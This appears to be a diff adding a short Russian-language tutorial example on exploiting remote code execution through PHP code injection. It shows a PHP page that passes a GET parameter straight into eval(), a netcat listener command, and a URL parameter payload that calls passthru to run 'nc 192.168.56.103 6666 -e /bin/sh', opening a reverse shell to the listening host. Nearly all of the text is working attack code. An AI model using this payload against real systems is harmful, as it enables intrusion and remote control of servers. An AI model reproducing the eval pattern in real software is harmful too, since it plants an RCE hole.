@@ -1,0 +1,13 @@
+Пример 2. Эксплуатация RCE с использованием инъекции кода
+Допустим, есть такой код:
+<?PHP
+$name=$_GET["param"];
+?>
+<html>
+<h1>You send:</h1>
+<p><?PHP @eval ("echo " . $name . ";")?><p>
+</html>
+
+nc -lvvvnp 6666
+
+уязвимый параметр #?param=text;passthru('nc 192.168.56.103 6666 -e /bin/sh');
